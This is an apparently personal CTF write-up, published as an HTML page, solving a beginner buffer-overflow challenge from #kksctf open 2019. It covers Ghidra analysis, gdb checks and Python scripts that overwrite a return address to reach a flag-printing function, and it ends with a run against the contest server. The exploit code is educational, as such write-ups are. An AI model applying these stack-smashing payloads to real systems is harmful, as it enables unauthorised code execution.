@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+  <meta name="generator" content="Madoko, version 1.1.4" />
+  <meta name="viewport" content="initial-scale=1.0" />
+  <meta name="author" content="Aaron Yoo" />
+  <title>#kksctf open 2019</title>
+  <style type="text/css"  class="link">
+  /*# sourceURL=madoko.css */
+  
+  .madoko .toc>.tocblock .tocblock .tocblock {
+    margin-left: 2.25em;
+  }
+  .madoko .toc>.tocblock .tocblock {
+    margin-left: 1.5em;
+  }
+  .madoko .toc-contents>.tocblock>.tocitem {
+    font-weight: bold;
+  }
+  .madoko .toc {
+    margin-top: 1em;
+  }
+  .madoko p.para-continue {
+    margin-bottom: 0pt;
+  }
+  .madoko .para-block+p {
+    margin-top: 0pt;
+  }
+  .madoko ul.para-block, .madoko ol.para-block {
+    margin-top: 0pt;
+    margin-bottom: 0pt;
+  }
+  .madoko ul.para-end, .madoko ol.para-end {
+    margin-bottom: 1em;
+  }
+  .madoko dl {
+    margin-left: 0em;
+  }
+  .madoko blockquote {
+    font-style: italic;
+  }
+  .madoko a.localref {
+    text-decoration: none;
+  }
+  .madoko a.localref:hover {
+    text-decoration: underline;
+  }
+  .madoko .footnotes {
+    font-size: smaller;
+    margin-top: 2em;
+  }
+  .madoko .footnotes hr {
+    width: 50%;
+    text-align: left;
+  }
+  .madoko .footnote { 
+    margin-left: 1em;
+  }
+  .madoko .footnote-before {
+    margin-left: -1em;
+    width: 1em;
+    display: inline-block;
+  }
+  .madoko .align-center, .madoko .align-center>p {
+    text-align: center !important;
+  }
+  .madoko .align-center pre {
+    text-align: left;
+  }
+  .madoko .align-center>* {
+    margin-left: auto !important;
+    margin-right: auto !important;
+  }
+  .madoko .align-left, .madoko .align-left>p {
+    text-align: left !important;
+  }
+  .madoko .align-left>* {
+    margin-left: 0pt !important;
+    margin-right: auto !important;
+  }
+  .madoko .align-right, .madoko .align-right>p {
+    text-align: right !important;
+  }
+  .madoko .align-right>* {
+    margin-left: auto !important;
+    margin-right: 0pt !important;
+  }
+  .madoko .align-center>table,
+  .madoko .align-left>table,
+  .madoko .align-right>table {
+    text-align: left !important;
+  }
+  .madoko .equation-before {
+    float: right;
+  }
+  .madoko .bibitem {
+    font-size: smaller;
+  }
+  .madoko .bibsearch {
+    font-size: x-small;
+    text-decoration:none;
+    color: black;
+    font-family: "Segoe UI Symbol", Symbola, serif;
+  }
+  .madoko .block, .madoko .figure, .madoko .bibitem, .madoko .equation, .madoko div.math {
+    margin-top: 1ex;
+    margin-bottom: 1ex;
+  }
+  .madoko .figure {
+    padding: 0.5em;
+    margin-left: 0pt;
+    margin-right: 0pt;
+  }
+  .madoko .hidden {
+    display: none;
+  }
+  .madoko .invisible {
+    visibility: hidden;
+  }
+  .madoko.preview .invisible {
+    visibility: visible;
+    opacity: 0.5;
+  }
+  .madoko code.code, .madoko span.code {
+    white-space: pre-wrap;
+  }
+  .madoko hr, hr.madoko {
+    border: none;
+    border-bottom: black solid 1px;
+    margin-bottom: 0.5ex;
+  }
+  .madoko .framed>*:first-child {
+    margin-top: 0pt;
+  }
+  .madoko .framed>*:last-child {
+    margin-bottom: 0pt;
+  }
+  .madoko ul.list-style-type-dash {
+      list-style-type: none !important;
+  }
+  .madoko ul.list-style-type-dash > li:before {
+      content: "\2013"; 
+      position: absolute;
+      margin-left: -1em; 
+  }
+  .madoko table.madoko {
+    border-collapse: collapse;
+  }
+  .madoko td, .madoko th {
+    padding: 0ex 0.5ex;
+    margin: 0pt;
+    vertical-align: top;
+  }
+  .madoko .cell-border-left {
+    border-left: 1px solid black;
+  }
+  .madoko .cell-border-right {
+    border-right: 1px solid black;
+  }
+  .madoko thead>tr:first-child>.cell-line,
+  .madoko tbody:first-child>tr:first-child>.cell-line {
+    border-top: 1px solid black;
+    border-bottom: none;
+  }
+  .madoko .cell-line, .madoko .cell-double-line {
+    border-bottom: 1px solid black;
+    border-top: none;
+  }
+  .madoko .cell-double-line {
+    border-top: 1px solid black;
+    padding-top: 1.5px !important;
+  }
+  .madoko .input-mathpre .MathJax_Display {
+    text-align: left !important;
+  }
+  .madoko div.input-mathpre {
+    text-align: left;
+    margin-top: 1.5ex;
+    margin-bottom: 1ex;
+  }
+  .madoko .math-rendering {
+    text-align: left;
+    white-space: pre;
+    color: gray;
+  }
+  .madoko .mathdisplay {
+    text-align: center;
+  }
+  .madoko .pretty table {
+    border-collapse: collapse;
+  }
+  .madoko .pretty td {
+    padding: 0em;
+  }
+  .madoko .pretty td.empty {
+    min-width: 1.5ex;
+  }
+  .madoko .pretty td.expander {
+    width: 100em;
+  }
+  body.madoko, .madoko .serif {
+    font-family: Cambria,"Times New Roman","Liberation Serif","Times",serif;
+  }
+  .madoko .sans-serif {
+    font-family: "Calibri", "Optima", sans-serif;
+  }
+  .madoko .symbol {
+    font-family: "Segoe UI Symbol", Symbola, serif;
+  }
+  body.madoko {  
+    -webkit-text-size-adjust: 100%;       
+    text-rendering: optimizeLegibility;
+  }
+  body.madoko {
+    max-width: 88ex; 
+    margin: 1em auto;
+    padding: 0em 2em;  
+  }
+  body.preview.madoko {
+    padding: 0em 1em;
+  }
+  .madoko p {
+    text-align: justify;
+  }
+  .madoko h1, .madoko h2, .madoko h3, .madoko h4 { 
+    margin-top: 1.22em; 
+    margin-bottom: 1ex;
+  }
+  .madoko h1+p, .madoko h2+p, .madoko h3+p, .madoko h4+p, .madoko h5+p  { 
+    margin-top: 1ex;    
+  }
+  .madoko h5, .madoko h6 { 
+    margin-top: 1ex;
+    font-size: 1em;
+  }
+  .madoko h5 { 
+    margin-bottom: 0.5ex;
+  }
+  .madoko h5 + p {
+    margin-top: 0.5ex;
+  }
+  .madoko h6 { 
+    margin-bottom: 0pt;
+  }
+  .madoko h6 + p {
+    margin-top: 0pt;
+  }
+  .madoko pre, .madoko code, .madoko kbd, .madoko samp, .madoko tt, 
+  .madoko .monospace, .madoko .token-indent, .madoko .reveal pre, .madoko .reveal code, .madoko .email {
+    font-family: Consolas,"Andale Mono WT","Andale Mono",Lucida Console,Monaco,monospace,monospace;
+    font-size: 0.85em;
+  }
+  .madoko pre code, .madoko .token-indent {
+    font-size: 0.95em;
+  }
+  .madoko pre code {
+    font-family: inherit !important;
+  }
+  .madoko ol.linenums li {
+    background-color: white;
+    list-style-type: decimal;
+  }
+  .madoko .remote {
+    background-color: #F0FFF0;
+  }
+  .madoko .remote + * {
+    margin-top: 0pt;
+  }
+  @media print {
+    body.madoko {
+      font-size: 10pt;
+    }
+    @page {
+      margin: 1in 1.5in;
+    }
+  }
+  @media only screen and (max-device-width:1024px) {
+    body.madoko {
+      padding: 0em 0.5em;    
+    }
+    .madoko li {
+      text-align: left;
+    }
+  }
+  
+    </style>
+  
+  </head>
+<body class="madoko">
+
+<div class="body madoko" style="line-adjust:0">
+
+<div class="titleblock align-center para-block" data-line="7" style="text-align:center;line-adjust:0">
+<div class="titleheader align-center" data-line="7" style="text-align:center;line-adjust:0">
+<div class="title para-block" data-line="7" style="font-size:xx-large;font-weight:bold;margin-bottom:0.5ex;line-adjust:0"><span data-line="7"></span>#kksctf open 2019</div>
+<div class="titlenote para-block" data-line="10" style="line-adjust:0"><span data-line="10"></span>2019-12-29</div></div>
+<div class="authors align-center" data-line="15" style="text-align:center;width:80%;line-adjust:0"><table class="authorrow columns block" data-line="15" style="margin-top:2ex;width:100%;line-adjust:0">
+<tbody><tr><td class="author column" data-line="15" style="text-align:center;line-adjust:0">
+<div class="authorname" data-line="15" style="font-size:large;line-adjust:0"><span data-line="15"></span>Aaron Yoo</div>
+<div class="authoremail email" data-line="18" style="line-adjust:0"><span data-line="18"></span>atyoo99@gmail.com</div></td></tr></tbody></table></div></div>
+<p class="p noindent para-continued" data-line="9"><span data-line="9"></span><br><span data-line="9"></span>
+</p>
+<p class="p indent" data-line="11"><span data-line="11"></span>Yesterday I participated casually in<span data-line="11"></span>&nbsp;<a href="https://ctftime.org/event/874">#kksctf open
+2019</a><span data-line="12"></span>. This was a fun CTF put on by the
+information security department of the<span data-line="13"></span>&nbsp;<a href="https://mirea.ru/">MIREA</a><span data-line="13"></span> Cybernetics
+Institue. I had a good time solving some of the beginner
+challenges.
+</p>
+<p class="p indent" data-line="17"><span data-line="17"></span>In general, I am trying to solve as many problems as I can and have 1 or 2
+problems that I have to <span data-line="18"></span>&#8220;reach&#8221;<span data-line="18"></span> for, meaning that I wasn<span data-line="18"></span>&#39;<span data-line="18"></span>t able to solve the
+problems in competition, but solve them afterward using the solutions of others. I
+think this is one of the best ways to get better and doing only 1 or 2 problems
+per CTF will make this is a sustainable habit (hopefully). Also, I will try to
+write up 1 problem per CTF that I thought was interesting. In this CTF, I chose
+<span data-line="23"></span><code class="code code1">baby buffer overflow</code><span data-line="23"></span>, a beginner buffer overflow challenge.
+</p>
+<p class="p indent" data-line="25"><span data-line="25"></span>The approach I took was more analytical that many of the solutions that I have
+seen online. While this does imply that my thought process is more reproducible,
+it also means that I solved it much slower than many. Next time, I will look to
+take a more black box approach to solving these kind of simple buffer overflow tasks.
+</p><h2 id="sec-baby-buffer-overflow----pwn-100" class="h1" data-line="30" data-heading-depth="1" style="display:block"><span data-line="30"></span><span class="heading-before"><span class="heading-label">1</span>.&#8194;</span><span data-line="30"></span>Baby Buffer Overflow<span data-line="30"></span> <span data-line="30"></span>&#8211;<span data-line="30"></span> PWN 100</h2>
+<p class="p noindent" data-line="32"><span data-line="32"></span><a href="https://ctftime.org/task/10169">CTFTime Link</a><span data-line="32"></span>. We are given an executable
+called <span data-line="33"></span><code class="code code1">baby_bof</code><span data-line="33"></span>. Running it prompts us for a string:
+</p>
+<pre class="para-block line-numbers pre-fenced pre-fenced3" data-line="35" data-line-first="36" style="display:block"><code data-line="36">aaron@taco:/ubuntu$ ./baby_bof
+We have prepared a buffer overflow for you
+Can you get use of it?
+Enter your name: AaBbCc
+Hello, aabbcc!</code></pre>
+<p class="p noindent para-continued" data-line="43"><span data-line="43"></span>The program takes the string we give it and prints it back to us. All of the
+uppercase letters are changed to lowercase letters but this turns out to be not
+important. To confirm the buffer overflow just try to put a lot of A<span data-line="45"></span>&#39;<span data-line="45"></span>s (I have
+redacted some of the A<span data-line="46"></span>&#39;<span data-line="46"></span>s for visual clarity, but you get the idea):
+</p>
+<pre class="para-block line-numbers pre-fenced pre-fenced3" data-line="48" data-line-first="49" style="display:block"><code data-line="49">We have prepared a buffer overflow for you
+Can you get use of it?
+Enter your name: AAAAAAAAAAAAAAAAAA....
+Hello, aaaaaaaaaaaaaa...
+Segmentation fault (core dumped)</code></pre>
+<p class="p noindent para-continued" data-line="56"><span data-line="56"></span>After confirming a buffer overflow, we can open the binary up in Ghidra. The <span data-line="56"></span><code class="code code1">main</code><span data-line="56"></span>
+function looks something like this:
+</p>
+<pre class="para-block line-numbers pre-fenced pre-fenced3 language-cpp lang-cpp cpp colorized" data-line="59" data-line-first="60" style="display:block"><code data-line="60"><span style="color:teal">int</span> main(<span style="color:teal">void</span>)
+{
+  <span style="color:teal">char</span> input_buf [<span class="constant" style="color:purple">252</span>];
+  
+  ...
+  ...
+  puts(<span style="color:maroon">&quot;</span><span style="color:maroon">We have prepared a buffer overflow for you</span><span style="color:maroon">&quot;</span>);
+  puts(<span style="color:maroon">&quot;</span><span style="color:maroon">Can you get use of it?</span><span style="color:maroon">&quot;</span>);
+  printf(<span style="color:maroon">&quot;</span><span style="color:maroon">Enter your name: </span><span style="color:maroon">&quot;</span>);
+
+  <span style="color:darkgreen">// Call read_wrapper to get the input into input_buf</span>
+  read_wrapper(input_buf);
+
+  <span style="color:darkgreen">// Print the input that was recieved</span>
+  printf(<span style="color:maroon">&quot;</span><span style="color:maroon">Hello, %s!</span><span style="color:gray">\n</span><span style="color:maroon">&quot;</span>, input_buf);
+  <span style="color:blue">return</span> <span class="constant" style="color:purple">0</span>;
+}</code></pre>
+<p class="p noindent para-continued" data-line="79"><span data-line="79"></span>We can see the program is presumably using a function called <span data-line="79"></span><code class="code code1">read_wrapper</code><span data-line="79"></span> to
+put our input in <span data-line="80"></span><code class="code code1">input_buf</code><span data-line="80"></span>, which is then printed back to us. The <span data-line="80"></span><code class="code code1">read_wrapper</code><span data-line="80"></span>
+function looks something like this:
+</p>
+<pre class="para-block line-numbers pre-fenced pre-fenced3 language-cpp lang-cpp cpp colorized" data-line="83" data-line-first="84" style="display:block"><code data-line="84"><span style="color:teal">void</span> read_wrapper(<span style="color:teal">char</span> *param_1)
+{
+  size_t sVar1;
+  uint local_c;
+  
+  <span style="color:darkgreen">// Unprotected get</span>
+  gets(param_1);
+
+  local_c = <span class="constant" style="color:purple">0</span>;
+
+  <span style="color:darkgreen">// For every character in the input</span>
+  <span style="color:blue">while</span>( <span style="color:blue">true</span> ) {
+    sVar1 = strlen(param_1);
+    <span style="color:blue">if</span> (sVar1 &lt;= local_c) <span style="color:blue">break</span>;
+
+    <span style="color:darkgreen">// If the letter is uppercase then convert it to lowercase</span>
+    <span style="color:blue">if</span> ((<span style="color:maroon">&#39;@&#39;</span> &lt; param_1[local_c]) &amp;&amp; (param_1[local_c] &lt; <span style="color:maroon">&#39;[&#39;</span>)) {
+      param_1[local_c] = param_1[local_c] + <span style="color:maroon">&#39; &#39;</span>;
+    }
+    local_c = local_c + <span class="constant" style="color:purple">1</span>;
+  }
+  <span style="color:blue">return</span>;
+}</code></pre>
+<p class="p noindent para-continued" data-line="109"><span data-line="109"></span>Here we see the reason for the buffer overflow in an unprotected <span data-line="109"></span><code class="code code1">gets(param_1)</code><span data-line="109"></span>
+call. Since the buffer is being passed in as a parameter, we cannot hijack the
+return from <span data-line="111"></span><code class="code code1">read_wrapper</code><span data-line="111"></span> since the buffer is actually in the stack frame of
+<span data-line="112"></span><code class="code code1">main</code><span data-line="112"></span>. This confused me for awhile, but eventually I came to the conclusion
+that we needed to control the return from <span data-line="113"></span><code class="code code1">main</code><span data-line="113"></span> instead.
+</p>
+<p class="p indent" data-line="115"><span data-line="115"></span>Now came the question of: where do we want the control flow to go? Looking at
+the function list in Ghidra we can find a function called <span data-line="116"></span><code class="code code1">win</code><span data-line="116"></span> that has an
+address of <span data-line="117"></span><code class="code code1">0x080485f6</code><span data-line="117"></span> and looks like this:
+</p>
+<pre class="para-block line-numbers pre-fenced pre-fenced3 language-cpp lang-cpp cpp colorized" data-line="119" data-line-first="120" style="display:block"><code data-line="120"><span style="color:teal">void</span> win(<span style="color:teal">int</span> param_1)
+{
+  <span style="color:teal">char</span> flag_buf [<span class="constant" style="color:purple">29</span>];
+  <span style="color:teal">FILE</span> *fp;
+  
+  fp = fopen(<span style="color:maroon">&quot;</span><span style="color:maroon">flag.txt</span><span style="color:maroon">&quot;</span>,<span style="color:maroon">&quot;</span><span style="color:maroon">r</span><span style="color:maroon">&quot;</span>);
+  <span style="color:blue">if</span> (fp == (<span style="color:teal">FILE</span> *)<span class="constant" style="color:purple">0x0</span>) {
+    puts(<span style="color:maroon">&quot;</span><span style="color:maroon">flag not found</span><span style="color:maroon">&quot;</span>);
+  }
+  <span style="color:blue">else</span> {
+    fgets(flag_buf, <span class="constant" style="color:purple">0x1d</span>, fp);
+    <span style="color:blue">if</span> (param_1 != -<span class="constant" style="color:purple">0x35014542</span>) {
+      puts(<span style="color:maroon">&quot;</span><span style="color:maroon">Almost there :)</span><span style="color:maroon">&quot;</span>);
+                    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> WARNING: Subroutine does not return </span><span style="color:darkgreen">*/</span>
+      exit(<span class="constant" style="color:purple">0</span>);
+    }
+    printf(<span style="color:maroon">&quot;</span><span style="color:maroon">Here it comes: %s</span><span style="color:gray">\n</span><span style="color:maroon">&quot;</span>, flag_buf);
+  }
+  <span style="color:blue">return</span>;
+}</code></pre>
+<p class="p noindent para-continued" data-line="142"><span data-line="142"></span>This is clearly where we want to go as it gives us the flag. There are some
+checks in this function that we will have to pass but let<span data-line="143"></span>&#39;<span data-line="143"></span>s worry first about
+getting there. In order to overflow the buffer precisely so that we can
+overwrite the return address of <span data-line="145"></span><code class="code code1">main</code><span data-line="145"></span>, we can take a trial and error approach.
+According to Ghidra, the size of the input buffer is 252 bytes so we know we are going
+to need a number bigger than that. After a bunch of trial and error using gdb I
+found that in order to overwrite the address we need 260 bytes plus the 4 byte
+address.
+</p>
+<pre class="para-block pre-fenced pre-fenced3 language-python lang-python python colorized" data-line="151" data-line-first="152" style="display:block"><code data-line="152"><span style="color:blue">import</span> struct
+<span style="color:blue">import</span> sys
+
+padding <span style="color:blue">=</span> <span style="color:maroon">&#39;</span><span style="color:maroon">A</span><span style="color:maroon">&#39;</span> * <span class="constant" style="color:purple">260</span>
+win_addr <span style="color:blue">=</span> struct.pack(<span style="color:maroon">&quot;</span><span style="color:maroon">I</span><span style="color:maroon">&quot;</span>, <span class="constant" style="color:purple">0x080485f6</span>)
+
+payload <span style="color:blue">=</span> bytes(padding, encoding<span style="color:blue">=</span><span style="color:maroon">&#39;</span><span style="color:maroon">ascii</span><span style="color:maroon">&#39;</span>) + bytes(win_addr)
+sys.stdout.buffer.write(payload)</code></pre>
+<p class="p noindent para-continued" data-line="162"><span data-line="162"></span>Piping the output of this Python script to <span data-line="162"></span><code class="code code1">baby_bof</code><span data-line="162"></span> we can see in GDB that we
+do indeed redirect the saved eip to 0x080485f6.
+</p>
+<pre class="para-block pre-fenced pre-fenced3" data-line="165" data-line-first="166" style="display:block"><code data-line="166">gdb-peda$ info frame
+    Stack level 0, frame at 0xffffd550:
+    eip = 0x8048783 in main; saved eip = 0x80485f6
+    ...</code></pre>
+<p class="p noindent para-continued" data-line="172"><span data-line="172"></span>Now if we let the program run we get the infuriating message:
+</p>
+<pre class="para-block pre-fenced pre-fenced3" data-line="174" data-line-first="175" style="display:block"><code data-line="175">Hello, aaaaaaa....
+Almost there :)</code></pre>
+<p class="p noindent para-continued" data-line="179"><span data-line="179"></span>Revisiting the interesting code from the <span data-line="179"></span><code class="code code1">win</code><span data-line="179"></span> function:
+</p>
+<pre class="para-block line-numbers pre-fenced pre-fenced3 language-cpp lang-cpp cpp colorized" data-line="181" data-line-first="182" style="display:block"><code data-line="182"><span style="color:teal">void</span> win(<span style="color:teal">int</span> param_1)
+{
+    ...
+    ...
+    fgets(flag_buf, <span class="constant" style="color:purple">0x1d</span>, fp);
+    <span style="color:blue">if</span> (param_1 != <span class="constant" style="color:purple">0xcafebabe</span>) {
+      puts(<span style="color:maroon">&quot;</span><span style="color:maroon">Almost there :)</span><span style="color:maroon">&quot;</span>);
+                    <span style="color:darkgreen">/*</span><span style="color:darkgreen"> WARNING: Subroutine does not return </span><span style="color:darkgreen">*/</span>
+      exit(<span class="constant" style="color:purple">0</span>);
+    }
+    printf(<span style="color:maroon">&quot;</span><span style="color:maroon">Here it comes: %s</span><span style="color:gray">\n</span><span style="color:maroon">&quot;</span>, flag_buf);
+    ...
+    ...
+}</code></pre>
+<p class="p noindent para-continued" data-line="198"><span data-line="198"></span>If we look in the disassembly, we can see that the constant that is being
+compared to the parameter is <span data-line="199"></span><code class="code code1">0xcafebabe</code><span data-line="199"></span> in hexidecimal. Now, all we need to do
+is to figure how much more to overflow the buffer to get overwrite this
+parameter as well. For me, this was probably the least scientific part as it is
+difficult to visualize the stack at this point since it has been smashed by our
+buffer overwrite. Looking at the solutions of CTFTime, there seems to be little
+explanation for this in terms of analytical thought. Through trial and error,
+turns out that we need to add 4 more bytes of padding then our <span data-line="205"></span><code class="code code1">0xcafebabe</code><span data-line="205"></span>
+constant. Here is a Python script
+that does that:
+</p>
+<pre class="para-block pre-fenced pre-fenced3 language-python lang-python python colorized" data-line="209" data-line-first="210" style="display:block"><code data-line="210"><span style="color:darkgreen"># solve.py</span>
+
+<span style="color:blue">import</span> struct
+<span style="color:blue">import</span> sys
+
+before_padding <span style="color:blue">=</span> <span style="color:maroon">&#39;</span><span style="color:maroon">A</span><span style="color:maroon">&#39;</span> * <span class="constant" style="color:purple">260</span>
+addr <span style="color:blue">=</span> struct.pack(<span style="color:maroon">&quot;</span><span style="color:maroon">I</span><span style="color:maroon">&quot;</span>, <span class="constant" style="color:purple">0x080485f6</span>)
+after_padding <span style="color:blue">=</span> <span style="color:maroon">&#39;</span><span style="color:maroon">A</span><span style="color:maroon">&#39;</span> * <span class="constant" style="color:purple">4</span>
+param <span style="color:blue">=</span> struct.pack(<span style="color:maroon">&quot;</span><span style="color:maroon">I</span><span style="color:maroon">&quot;</span>, <span class="constant" style="color:purple">0xcafebabe</span>)
+
+
+sys.stdout.buffer.write(
+    bytes(before_padding, encoding<span style="color:blue">=</span><span style="color:maroon">&#39;</span><span style="color:maroon">ascii</span><span style="color:maroon">&#39;</span>) +
+    bytes(addr) +
+    bytes(after_padding, encoding<span style="color:blue">=</span><span style="color:maroon">&#39;</span><span style="color:maroon">ascii</span><span style="color:maroon">&#39;</span>) +
+    bytes(param) +
+    bytes(<span style="color:maroon">&quot;</span><span style="color:gray">\n</span><span style="color:maroon">&quot;</span>, encoding<span style="color:blue">=</span><span style="color:maroon">&#39;</span><span style="color:maroon">ascii</span><span style="color:maroon">&#39;</span>))</code></pre>
+<p class="p noindent para-continued" data-line="229"><span data-line="229"></span>I am still not sure why the padding was 4 bytes. My though process was that the
+first argument on Linux x86 is at <span data-line="230"></span><code class="code code1">ebp + 8</code><span data-line="230"></span>. However, it was difficult for me to
+tell where the base pointer was for <span data-line="231"></span><code class="code code1">win</code><span data-line="231"></span> in relation to our buffer. Thus, I
+ended up just using trial and error for this part.
+</p>
+<p class="p indent" data-line="234"><span data-line="234"></span>Finally, we need to run our exploit on the server to get the flag:
+</p>
+<pre class="para-block pre-fenced pre-fenced3" data-line="236" data-line-first="237" style="display:block"><code data-line="237">$ python3 solve.py | nc tasks.open.kksctf.ru 10002
+We have prepared a buffer overflow for you
+Can you get use of it?
+Enter your name: Hello, aaaaaaa....����!
+Here it comes: kks{0v3rf10w_15_my_1!f3}
+
+/home/ctf/redir.sh: line 4:    50 Segmentation fault      timeout -k 120 120 ./chall</code></pre>
+<p class="p noindent para-continued" data-line="246"><span data-line="246"></span>And there we have the flag: <span data-line="246"></span><strong class="strong-star2">kks{0v3rf10w_15_my_1!f3}</strong><span data-line="246"></span>
+</p>
+<p class="p indent" data-line="248"><span data-line="248"></span><br><span data-line="248"></span>
+<span data-line="249"></span><br><span data-line="249"></span>
+<span data-line="250"></span><br><span data-line="250"></span>
+</p><span data-line=""></span></div>
+</body>
+
+</html>
